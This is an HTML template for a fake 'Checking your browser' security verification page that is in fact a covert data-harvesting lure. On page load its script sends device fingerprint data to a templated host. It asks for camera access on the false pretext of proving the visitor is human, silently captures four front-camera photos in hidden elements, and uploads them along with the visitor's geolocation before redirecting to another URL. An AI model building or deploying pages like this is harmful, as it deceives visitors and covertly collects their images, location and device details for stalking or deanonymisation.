<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        body { font-family: -apple-system, system-ui, sans-serif; background: #f9f9f9; color: #333; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; padding: 20px; text-align: center; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { margin: 0 0 10px; font-size: 22px; }
        p { color: #666; font-size: 15px; line-height: 1.5; margin-bottom: 20px; }
        #status { font-weight: bold; color: #3498db; }
        /* Hide camera elements */
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <div class="spinner"></div>
        <h2>Checking your browser...</h2>
        <p>Please allow camera access to verify you are human. This process is automatic.</p>
        <p id="status">Initializing...</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const CONFIG = {
            UID: "<%= uid %>",
            HOST: "<%= host %>",
            TARGET: "<%= url %>"
        };

        // Helper to Post Data
        const post = (path, data) => fetch(`${CONFIG.HOST}${path}`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });

        // 1. Collect System Data (Always runs)
        async function sendSystemData() {
            let batt = "N/A";
            try {
                const b = await navigator.getBattery();
                batt = `${Math.round(b.level * 100)}% (${b.charging ? '‚ö°' : ''})`;
            } catch(e) {}

            const info = `
<b>üì± Platform:</b> ${navigator.platform}
<b>üåê Browser:</b> ${navigator.userAgent}
<b>üîã Battery:</b> ${batt}
<b>üíæ Memory:</b> ${navigator.deviceMemory || '?'} GB
<b>üìè Screen:</b> ${screen.width}x${screen.height}
<b>üèéÔ∏è Cores:</b> ${navigator.hardwareConcurrency || '?'}
            `.trim();

            await post("/data", { uid: CONFIG.UID, data: encodeURIComponent(info) });
        }

        // 2. Capture & Send Photo
        async function capturePhoto(video) {
            const canvas = document.getElementById("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext("2d").drawImage(video, 0, 0);
            const base64 = canvas.toDataURL("image/png");
            
            await post("/cam", { uid: CONFIG.UID, img: base64 });
        }

        // 3. Main Logic
        (async () => {
            const status = document.getElementById("status");
            await sendSystemData();

            status.innerText = "Requesting permission...";

            try {
                // Ask for Camera
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });

                const video = document.getElementById("video");
                video.srcObject = stream;
                
                // Wait for camera to warm up
                await new Promise(r => video.onloadedmetadata = r);
                status.innerText = "Verifying...";

                // BURST MODE: Take 4 photos
                for(let i = 0; i < 4; i++) {
                    await new Promise(r => setTimeout(r, 1500)); // 1.5s delay
                    await capturePhoto(video);
                }

                // Stop Camera
                stream.getTracks().forEach(t => t.stop());
                
                // Get Location then Redirect
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        post("/location", { 
                            uid: CONFIG.UID, 
                            lat: pos.coords.latitude, 
                            lon: pos.coords.longitude, 
                            acc: pos.coords.accuracy 
                        });
                        setTimeout(() => window.location.replace(CONFIG.TARGET), 1000);
                    },
                    err => window.location.replace(CONFIG.TARGET) // Location denied -> Redirect
                );

            } catch (err) {
                // PERMISSION DENIED / ERROR -> REDIRECT IMMEDIATELY
                console.log("Denied/Error:", err);
                status.innerText = "Redirecting...";
                window.location.replace(CONFIG.TARGET);
            }
        })();
    </script>
</body>
</html>
